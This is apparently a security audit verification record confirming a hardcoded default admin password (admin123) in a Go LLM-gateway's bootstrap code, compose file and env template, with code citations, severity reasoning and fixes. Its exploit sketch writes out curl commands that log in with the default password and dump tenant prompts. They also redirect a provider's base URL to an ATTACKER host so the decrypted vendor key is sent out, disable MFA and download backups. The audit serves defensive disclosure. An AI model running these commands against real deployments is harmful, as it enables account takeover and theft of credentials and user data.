title: CONFIRMED: admin/admin123 is shipped as a literal in the Go bootstrap, docker-compose.yml and the tracked .env.template, no must-change-password state exists anywhere server-side, and on the documented Docker path the only warning never even fires
evidence: All cited locations were opened and match verbatim, so no line correction is needed. main.go:170 `	pass := cfg.AdminPassword` / 171 `	if pass == "" {` / 172 `		pass = "admin123" // 仅在未设置环境变量时默认，首次启动后必须修改` / 173 `		log.Println("[bootstrap] WARNING: using default admin password 'admin123'. Set ADMIN_PASSWORD to change.")`; stored via 175 `hash, err := bcrypt.GenerateFromPassword([]byte(pass), bcrypt.DefaultCost)` and 179 `u := model.AdminUser{Username: cfg.AdminUser, PasswordHash: string(hash)}`. docker-compose.yml:18 `      - ADMIN_PASSWORD=${ADMIN_PASSWORD:-admin123}`; .env.template:28 `ADMIN_PASSWORD=admin123` (uncommented, file header line 3 says `cp .env.template .env`). config.go:66 `AdminPassword:      os.Getenv("ADMIN_PASSWORD")` and config.go:65 `AdminUser:          getenv("ADMIN_USER", "admin")`. routes.go:42 `	api.POST("/auth/login", s.login)` — the only member of the bare group at routes.go:41 without `s.AuthMiddleware()`, no throttle middleware (grep `gin.HandlerFunc` in package admin -> middleware.go:14 only); listener binds every interface (main.go:126 `srv := &http.Server{Addr: fmt.Sprintf(":%d", cfg.ListenPort), Handler: engine}`) and compose:10 publishes `${PORT:-8080}:8080`. auth.go:133 `	needBind := sec.MFAEnabled && sec.MFARequiredAll && !u.MFAEnabled` is the last statement before `s.ok(c, gin.H{"token": token, ...})` (134-138) — response data only. NEGATIVE CLAIM INDEPENDENTLY RE-VERIFIED: whole-repo grep for `must_?change|MustChange|force_change|need_change|password_set|first_?login|initial_?password` yields exactly one hit, in the auditor's own recommendation text in docs/security/raw/audit-secrets.json; model.AdminUser (model.go:13-26) has no such column; auth.go:157-184 changePassword requires the old password (:176) and writes only `password_hash` (:181).
impact: Unauthenticated -> full administrative control on any deployment that keeps the shipped default, and the default is published in three files of this repository (main.go:172, docker-compose.yml:18, .env.template:28) plus README.md:48 / quickstart.en.md:47. MFA cannot compensate: settings.go:87 defaults `Security{MFAEnabled: true, MFARequiredAll: false, ...}` and the 2FA branch auth.go:86 `if sec.MFAEnabled && u.MFAEnabled` needs the user row bound, which the bootstrap row never is (model.go:18 zero value; no user-creation route — routes.go:133-135 is list / unbind-mfa / unlock), so a stock install is single-factor and even the needBind nudge evaluates false. The 5-fail/15-min lockout (auth.go:113-122) is per-account and meaningless against a known password; there is no IP-based login throttle (quota limiter is gateway-only, main.go:63-67, routes.go:28). Payload behind that one POST: mint gateway keys in plaintext (apikeys.go:39 `key := "sk-" + crypto.RandomHex(16)`, returned once at :54), read every tenant prompt/response (GET /audit/calls), download the whole DB (GET /backups/:id/download), disable MFA globally (PUT /settings/security), and steal live upstream vendor credentials — IMPACT WORDING TIGHTENED: testProvider (providers.go:156-218) does not itself return keys (only `{ok, latency_ms, message, models}` at :218) and GET /config/export cannot leak them (bundle.go:17/32 marshals model.Provider whose ciphertext column is `json:"-"`, model.go:107); the real exfil primitive is that updateProvider takes `p.BaseURL` verbatim (:110) and testProvider then sends the DECRYPTED key to it — :163 `key, _ := s.enc.Decrypt(p.APIKeyEnc)` -> :180 `req.Header.Set("Authorization", "Bearer "+key)` (anthropic: :177 `x-api-key`). NEW CONSEQUENCE BEYOND THE PRE-AGREED warn-only JWT_SECRET/MASTER_KEY pair (duplication check passed): warnInsecureDefaults (main.go:187-194) evaluates only JWT_SECRET and MASTER_KEY — never the admin credential — and because compose:18 always injects a non-empty value, main.go:171's `if pass == ""` is false on the documented Docker path, so lines 172-173 are dead while bcrypt("admin123") is exactly what is written: no boot alert at all, contradicting README.md:56 and quickstart.en.md:47 which both promise one.
mitigations_checked: Verified present, and none closes this: bcrypt hash at creation (main.go:175, DefaultCost) and constant-time library compare (auth.go:76); per-account 5-fail/15-min lockout (auth.go:38-41 via IsLocked, 113-122) — throttles guessing of a CHANGED password only, useless against the published one; bootstrap runs only while admin_users is empty (main.go:166-168), so it cannot re-plant the default on an existing DB (but also means the default persists forever if never rotated); MFA machinery exists and is genuinely enforced for users who HAVE bound it (auth.go:86-108, single-use uid-bound tickets at 46-73); PUT /auth/password exists (routes.go:45) with an 8-char minimum (auth.go:166) — note `admin123` is 8 chars so it passes that policy; provider key ciphertext is not serialized (model.go:107 `json:"-"`); security headers + untrusted-XFF defaults (main.go:92-103) are irrelevant to a valid-credential login; documentation-only warnings (.env.template:27, quickstart.en.md:51/83, README.md:56) instruct a change but enforce nothing and are skipped by a one-line omission or by the no-.env compose path. NOT mitigations: no must-change-password flag, no login-time weak/default credential check, no IP throttling on /auth/login, no server-side consumer of `grace_days`.
recommendation: Adopt the finding as written and add two specifics: (1) delete the literals from .env.template:28 and docker-compose.yml:18 (comment them out and use `${ADMIN_PASSWORD:?set-admin-password}` — the `${VAR:?msg}` form already appears at compose:37, albeit inside the commented redis block), so a default compose up either gets an explicit operator password or fails fast; (2) in bootstrapAdmin, replace the literal with `crypto.RandomHex(...)` printed once (or refuse to start), and add `must_change_password` to model.AdminUser set at bootstrap, honored in AuthMiddleware (allow-list /auth/me, /auth/password, /account/mfa/*) and cleared in changePassword (auth.go:181). Independently, extend warnInsecureDefaults (main.go:187-194) to flag a live admin account whose hash still matches a published default, since ADMIN_PASSWORD is otherwise read exactly once at first boot.
reason:
VERDICT: confirmed as filed; severity high upheld; no line correction (reported line 172 is the exact assignment of the literal). Files read end-to-end before judging: backend/cmd/server/main.go (216), backend/internal/admin/auth.go (282), routes.go (196), middleware.go (33), backend/internal/config/config.go (76), backend/internal/settings/settings.go (158), backend/internal/admin/providers.go (378), apikeys.go, backend/internal/runtime/bundle.go (180), docker-compose.yml (38), .env.template (52); plus my own re-runs of every grep the finding leans on.

(1) EVIDENCE INTEGRITY — perfect. Every quote reproduces verbatim at the exact line, including the Chinese trailing comment on main.go:172 and the single-quoted `'admin123'` inside the log.Println string at :173. docker-compose.yml:18 and .env.template:28 are exact (the latter is genuinely uncommented, and .env.template:27 admits the fallback in prose). auth.go:133 is exact and is the whole of issueLogin's decision surface (124-139): the token is issued at :125, `last_login_at` at :131, audit at :132, then needBind at :133 and the JSON response at :134-138 — nothing about it can withhold or scope a session.

(2) THE ABSENCE CLAIM SURVIVES ADVERSARIAL SEARCH. I looked specifically for the standard refutation — a server-side 'password was never changed' state — and there is none: the negative grep returns only the auditor's own text; AdminUser has no such field; the login path never compares the presented credential to a known-weak value; the only rotation endpoint requires the old password and stamps nothing else. Frontend has no gate either: Login.tsx:46 only reacts to `need_bind_mfa` client-side, so a `curl` client bypasses every 'advisory' consequence by construction.

(3) CHAIN INTEGRITY — the attacker lacks the privilege beforehand and the input is attacker-reachable. All three first-boot paths converge on the same published literal: the Go zero-config path (config.go:66 yields "" -> main.go:172), the compose path (compose:18 -> `admin123`), and the copy-the-template path (.env.template:28). Exposure is real, not theoretical: main.go:126 binds `:8080` on all interfaces and docker-compose.yml:10 publishes it. Login is the only unauthenticated admin route (routes.go:41-42) and has no rate limiter — middleware.go is signature-only, and grep shows `gin.HandlerFunc` defined exactly once in the admin package. The one control an operator might assume helps (MFA) is structurally absent for the only account that exists by default (auth.go:86 requires u.MFAEnabled; main.go:179 never sets it; no user-creation route), and with MFARequiredAll=false even the advisory flag is false. So: one POST, one known string, 24h HS256 superuser token.

(4) WHERE I FIXED THE REPORT (does not change the verdict): the phrase "all provider keys re-enterable/exportable via testProvider" is loose — testProvider's response contains no key (:218) and /config/export cannot leak them (model.go:107 `json:"-"`, bundle.go:17/32). Plaintext provider-key theft is nonetheless fully real via the admin-settable BaseURL (:110) + decrypt-and-send at :163/:180/:177, which is arguably worse than an export because it needs no MASTER_KEY. "all gateway keys creatable" is exactly right (apikeys.go:39/54). Cosmetic: the recommendation's exemplar `docker-compose.yml:37` lives inside a commented-out block (lines 34-38), so it is a precedent for the syntax, not a working control.

(5) REINFORCEMENTS I FOUND THAT THE REPORT DID NOT STATE. (a) The empty-string gate makes the sole warning dead code on the flagship deployment: compose:18 always supplies a value, so main.go:171 is false and :172-173 never run even though `admin123` is precisely what is hashed at :175 — while README.md:56 ('prints the default password to the console') and quickstart.en.md:47 ('startup logs print a WARNING') assert the opposite. A silent, published credential is materially worse handling than the already-accepted JWT_SECRET/MASTER_KEY warn-only pair, which at least prints on the Go-default path. (b) warnInsecureDefaults (:187-194) never considers cfg.AdminPassword, and there is no later re-check, so nothing in the running product can ever tell that its only human gate is a string from a public repo. (c) Duplicate check: the brief's non-re-report list covers JWT_SECRET/MASTER_KEY, TRUSTED_PROXIES, WriteTimeout, passthrough semantics and the SQLite design — not ADMIN_PASSWORD — so this item is new-consequence, not restated architecture.

(6) SEVERITY. HIGH, no downgrade. Against the rubric, critical is for unauth RCE/authz-bypass/data-exfil; this is textbook ACCOUNT TAKEOVER whose precondition is operator inaction on a single, documented env var (and the code does hash it, does warn on the non-compose path, and does provide rotation), so I decline to escalate it to critical. It is equally not medium/low: it is more than defense-in-depth hygiene because the credential is a repository constant, the console is 0.0.0.0 by default, the second factor is inert for the bootstrapped account, and the asset behind the login is every upstream vendor key plus every tenant's prompts and completions. Confirmed at high.
exploit_sketch:
Path A — the project's own quickstart, nothing to guess:
1) Operator runs quickstart.en.md:83-84 (`cp .env.template .env` — line 28 carries `ADMIN_PASSWORD=admin123` — then `docker compose up -d`), or skips .env and lets docker-compose.yml:18 supply it. admin_users is empty (main.go:166-168), `pass` is the non-empty literal so the WARNING at :172-173 never fires, and the boot log shows only `[bootstrap] created admin user: admin` (:183). Console listens on 0.0.0.0:8080 (main.go:126, compose:10).
2) Attacker, from the README alone:
   TOK=$(curl -sS -X POST http://TARGET:8080/api/admin/v1/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | jq -r .data.token)
   auth.go:34 row found -> :38 not locked -> :76 bcrypt matches -> :81 counter reset -> :86 skipped (u.MFAEnabled=false) -> :110/:125 issue 24h HS256 JWT. No second factor, no throttle, no lockout risk (first try succeeds), no browser needed.
3) Cash out:
   curl -sS -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"name":"ci"}' http://TARGET:8080/api/admin/v1/apikeys      # apikeys.go:39/54 -> plaintext sk-... usable on /v1/chat/completions
   curl -sS -H "Authorization: Bearer $TOK" 'http://TARGET:8080/api/admin/v1/audit/calls?size=200'                                                 # every tenant prompt/response
   curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"name":"openai","protocol":"openai_chat","base_url":"http://ATTACKER:9999/v1","enabled":true}' http://TARGET:8080/api/admin/v1/providers/1   # providers.go:110
   curl -sS -X POST -H "Authorization: Bearer $TOK" http://TARGET:8080/api/admin/v1/providers/1/test                                              # :163 decrypts, :180 ships the victim's real OpenAI key to ATTACKER
   curl -sS -X PUT -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"mfa_enabled":false,"mfa_required_for_all":false,"recovery_code_count":10,"grace_days":0}' http://TARGET:8080/api/admin/v1/settings/security
   curl -sS -H "Authorization: Bearer $TOK" http://TARGET:8080/api/admin/v1/backups/1/download                                                     # full config/DB copy
Path B — mass scanning of internet-exposed instances: username and password are both project constants (config.go:65, main.go:172 / compose:18), so a single-request probe per host is definitive; the lockout never engages because the attempt succeeds, and there is no per-IP limit on routes.go:42.
